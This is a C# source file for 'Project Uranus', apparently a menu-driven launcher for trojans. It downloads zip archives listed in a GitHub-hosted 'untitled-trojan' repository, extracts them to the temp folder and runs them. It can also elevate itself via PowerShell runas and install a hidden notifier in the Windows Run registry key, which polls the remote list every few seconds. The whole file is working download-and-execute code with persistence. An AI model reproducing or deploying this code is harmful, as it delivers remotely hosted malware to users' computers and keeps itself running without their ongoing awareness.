using Microsoft.Toolkit.Uwp.Notifications;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Windows.ApplicationModel.Activation;
using Windows.Foundation.Collections;

namespace Uranus
{
    public class Program
    {
        public static int IntVer = 1;
        public static bool isRussian = false;
        public static string Files = "https://raw.githubusercontent.com/realuntitledstudio/untitled-trojan/main/Uranus/Files/";

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

        public static string Fetch(string path)
        {
            using (WebClient client = new WebClient())
                return client.DownloadString(Files + path);
        }

        public static string GetStr(int i) => isRussian ? Localization.russian[i] : Localization.english[i];

        public static void ExecuteAsAdmin(string fileName, string args)
        {
            Process proc = new Process();
            proc.StartInfo.FileName = "powershell.exe";
            proc.StartInfo.UseShellExecute = true;
            proc.StartInfo.Arguments = $"-Command Start-Process \"{fileName}\" -Verb runas -ArgumentList \"{args}\"";
            proc.Start();
        }

        public static void Execute(string fileName, string args)
        {
            Process proc = new Process();
            proc.StartInfo.FileName = fileName;
            proc.StartInfo.UseShellExecute = true;
            proc.StartInfo.Arguments = args;
            proc.Start();
        }

        public static async Task Main(string[] args)
        {
            if (args.Length != 0)
            {
                switch (args[0])
                {
                    case "/autorun":
                        ShowWindow(GetConsoleWindow(), SW_HIDE);
                        using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
                        {
                            WindowsPrincipal principal = new WindowsPrincipal(identity);
                            if (principal.IsInRole(WindowsBuiltInRole.Administrator))
                            {
                                RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                                rkApp.SetValue("Project Uranus Notifier", Assembly.GetEntryAssembly().Location + " /notifier");
                                Execute(Assembly.GetEntryAssembly().Location, "/notifier");
                            }
                        }
                        return;
                    case "/notifier":
                        ShowWindow(GetConsoleWindow(), SW_HIDE);
                        string current = "";
                        string last = "";
                        ToastNotificationManagerCompat.OnActivated += toastArgs =>
                        {
                            if (toastArgs.Argument == "open")
                                Execute(Assembly.GetEntryAssembly().Location, "");
                        };
                        while (true)
                        {
                            try
                            {
                                current = Fetch("Trojans.txt");
                                if (current != last)
                                {
                                    new ToastContentBuilder()
                                        .AddText("A new trojan has been added!")
                                        .AddText("Check it out in Project Uranus.")
                                        .AddButton("Open Uranus", ToastActivationType.Background, "open")
                                        .Show();
                                }
                                last = current;
                            }
                            catch { }
                            await Task.Delay(5000);
                        }
                }
            }

            Console.Title = $"Project Uranus | Modification {IntVer}";

            await CoolConsole.WriteLine("=================================");
            await CoolConsole.WriteLine("Project Uranus - TheAirBlow");
            await CoolConsole.WriteLine(GetStr(0));
            await CoolConsole.WriteLine("=================================");
            Console.ForegroundColor = ConsoleColor.Yellow;
            await CoolConsole.WriteLine("Напиши '1'  - Русский язык");
            await CoolConsole.WriteLine("Press Enter - English language");
            await CoolConsole.WriteLine("Note: Internet required");
            await CoolConsole.WriteLine("Заметка: Нужен Интернет");
            Console.ForegroundColor = ConsoleColor.Gray;
            await CoolConsole.WriteLine("=================================");
            char option1 = Console.ReadKey().KeyChar;
            Console.CursorLeft = 0;
            Console.CursorTop -= 5;
            await CoolConsole.ClearLines(6);
            if (option1 == '1') isRussian = true;

            await CoolConsole.Loading(5);
            Console.Clear();

            int latest = int.Parse(Fetch("LatestVersion.txt"));
            if (latest > IntVer)
            {
                await CoolConsole.WriteLine("=================================");
                await CoolConsole.WriteLine("Project Uranus - TheAirBlow");
                await CoolConsole.WriteLine(GetStr(0));
                await CoolConsole.WriteLine("=================================");
                Console.ForegroundColor = ConsoleColor.Yellow;
                await CoolConsole.WriteLine(GetStr(7));
                await CoolConsole.WriteLine(GetStr(8));
                Console.ForegroundColor = ConsoleColor.Gray;
                await CoolConsole.WriteLine("=================================");
                await Task.Delay(5000);
                Console.Clear();
            }

            await CoolConsole.WriteLine("=================================");
            await CoolConsole.WriteLine("Project Uranus - TheAirBlow");
            await CoolConsole.WriteLine(GetStr(0));
            await CoolConsole.WriteLine("=================================");
            Console.ForegroundColor = ConsoleColor.Yellow;
            await CoolConsole.WriteLine(GetStr(10));
            Console.ForegroundColor = ConsoleColor.Gray;
            await CoolConsole.WriteLine("=================================");
            char option2 = Console.ReadKey().KeyChar;
            Console.CursorLeft = 0;
            Console.CursorTop -= 5;
            await CoolConsole.ClearLines(6);
            if (option2 == '1') 
                ExecuteAsAdmin(Assembly.GetEntryAssembly().Location, "/autorun");

            await CoolConsole.Loading(5);
            Console.Clear();

            await CoolConsole.WriteLine("=================================");
            await CoolConsole.WriteLine("Project Uranus - TheAirBlow");
            await CoolConsole.WriteLine(GetStr(0));  
            await CoolConsole.WriteLine("=================================");
            Console.ForegroundColor = ConsoleColor.Yellow;
            await CoolConsole.WriteLine(GetStr(1));
            Console.ForegroundColor = ConsoleColor.Gray;
            await CoolConsole.WriteLine("=================================");
            char option = Console.ReadKey().KeyChar;
            Console.CursorLeft = 0;
            Console.CursorTop -= 4;
            await CoolConsole.ClearLines(6);
            if (option != '1')
            {
                await CoolConsole.WriteLine(GetStr(2));
                await CoolConsole.WriteLine("=================================");
                await Task.Delay(1000);
                return;
            }
            await Menu();
        }

        public static async Task Menu()
        {
            string[] trojans = Fetch("Trojans.txt").Split('\n');
            List<Trojan> trojanData = new List<Trojan>();
            foreach (string str in trojans)
            {
                string[] trojan = Fetch(str).Split('\n');
                Trojan t = new Trojan();
                t.name = trojan[0];
                t.path = trojan[1];
                t.file = trojan[2];
                trojanData.Add(t);
            }

            Console.CursorTop = 4;
            await CoolConsole.ClearLines(10);
            Console.ForegroundColor = ConsoleColor.Cyan;
            await CoolConsole.WriteLine(GetStr(3));
            for (int i = 0; i < trojanData.Count; i++)
            {
                Trojan t = trojanData[i];
                await CoolConsole.WriteLine($"{i}) {t.name}");
            }
            await CoolConsole.WriteLine(GetStr(4));
            Console.ForegroundColor = ConsoleColor.Gray;
            await CoolConsole.WriteLine("=================================");
            char option = Console.ReadKey().KeyChar;
            Console.CursorLeft = 0;
            switch (option)
            {
                case '#':
                    Console.CursorTop = 4;
                    await CoolConsole.ClearLines(6);
                    await CoolConsole.WriteLine(GetStr(2));
                    await CoolConsole.WriteLine("=================================");
                    await Task.Delay(1000);
                    return;
                default:
                    int i = 0;
                    try { i = int.Parse(option.ToString()); }
                    catch { }

                    if (i >= 0 && i < trojanData.Count)
                    {
                        Console.CursorTop = 4;
                        await CoolConsole.ClearLines(10);
                        await CoolConsole.WriteLine(GetStr(9));
                        if (Directory.Exists(Path.Combine(Path.GetTempPath(), "ProjectUranus")))
                        {
                            string[] files = Directory.GetFiles(Path.Combine(Path.GetTempPath(), "ProjectUranus"));
                            foreach (string file in files) File.Delete(file);
                        }
                        Directory.CreateDirectory(Path.Combine(Path.GetTempPath(), "ProjectUranus"));
                        using (var client = new WebClient())
                            client.DownloadFile(trojanData[i].path, Path.Combine(Path.GetTempPath(), "ProjectUranus", "trojan.zip"));
                        ZipFile.ExtractToDirectory(Path.Combine(Path.GetTempPath(), "ProjectUranus", "trojan.zip"),
                            Path.Combine(Path.GetTempPath(), "ProjectUranus"));
                        Process.Start(Path.Combine(Path.GetTempPath(), "ProjectUranus", trojanData[i].file));
                    }
                    else
                    {
                        Console.CursorTop = 4;
                        await CoolConsole.ClearLines(5);
                        Console.ForegroundColor = ConsoleColor.Red;
                        await CoolConsole.WriteLine(GetStr(5));
                        Console.ForegroundColor = ConsoleColor.Gray;
                        await CoolConsole.WriteLine("=================================");
                        await Task.Delay(1000);
                        await Menu();
                    }
                    await Menu();
                    return;
            }
        }
    }
}
